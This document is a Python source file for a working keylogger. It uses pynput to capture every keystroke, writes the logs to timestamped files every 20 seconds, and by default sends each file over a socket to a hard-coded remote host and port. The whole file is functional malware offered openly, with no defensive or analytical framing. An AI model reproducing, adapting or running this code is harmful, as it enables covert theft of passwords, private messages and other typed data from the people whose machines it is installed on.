import os
import socket
from pynput.keyboard import  Key, Listener
from threading import Timer
from datetime import datetime

LOG_INTERVAL = 20
BUFFER_SIZE = 4096
HOST = "192.168.29.100"
PORT = 5001

class KeyLogger():
    def __init__(self, interval, remote_transfer=False, exit_with_esc=False):
        print("Initailized Program..!")
        self.interval = interval
        self.remote_transfer = remote_transfer
        self.exit_with_esc = exit_with_esc
        self.log_string = ""
        self.session_start = datetime.utcnow()
        self.session_end = datetime.utcnow()
        self.path = "./logs"
        if self.remote_transfer:
            self.s = socket.socket()

        if not os.path.exists(self.path):
            os.makedirs(self.path)

    def on_press(self, key):
        char = ""
        if type(key) == Key:
            if key == Key.space:
                char = " "
            elif key == Key.enter:
                char = "\n[ENTER]"
            elif (key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r 
                or key == Key.shift or key == Key.shift_l or key == Key.shift_r):
                pass
            else:
                char = str(key)[4:].replace(" ", "_").upper()
                char = f"[{char}]"
        else:
            char = key.char
        self.log_string += char

    def on_release(self, key):
        if key == Key.esc:
            print("\n[~] Exited Program")
            return False

    def update_filename(self):
        session_start_str = str(self.session_start)[:-7].replace(" ", "-").replace(":", "")
        session_end_str = str(self.session_end)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{session_start_str}_{session_end_str}"

    def write_to_file(self):
        with open(f"{os.path.join(self.path, self.filename)}.txt", "w") as f:
            print(self.log_string, file=f)
        if not self.remote_transfer:
            print(f"[+] Saved logs/{self.filename}.txt")

    def send_file(self):
        filename = f"{os.path.join(self.path, self.filename)}.txt"
        filesize = os.path.getsize(filename)
        self.s.send((f"{self.filename}.txt").encode('utf-8'))
        with open(f"{os.path.join(self.path, self.filename)}.txt", "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                self.s.sendall(bytes_read)
        print(f"[+] Saved logs/{self.filename}.txt and also sent the file to remote server")


    def report(self):
        if self.log_string:
            self.session_end = datetime.utcnow()
            self.update_filename()
            self.write_to_file()
            if self.remote_transfer:
                self.send_file()
            self.session_start = datetime.utcnow()
        self.log_string = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.session_start = datetime.utcnow()
        if self.remote_transfer:
            self.s.connect((HOST, PORT))
        self.report()
        if self.exit_with_esc == True:
            with Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
                self.listener.join()
        else:
            with Listener(on_press=self.on_press) as self.listener:
                self.listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(interval=LOG_INTERVAL, remote_transfer=True, exit_with_esc=True)
    try:
        keylogger.start()
    except:
        if keylogger.remote_transfer:
            keylogger.s.close()
            print("\n[~] Server disconnected")
            print("[~] Exited Program")
        else:
            print("\n[~] Exited Program")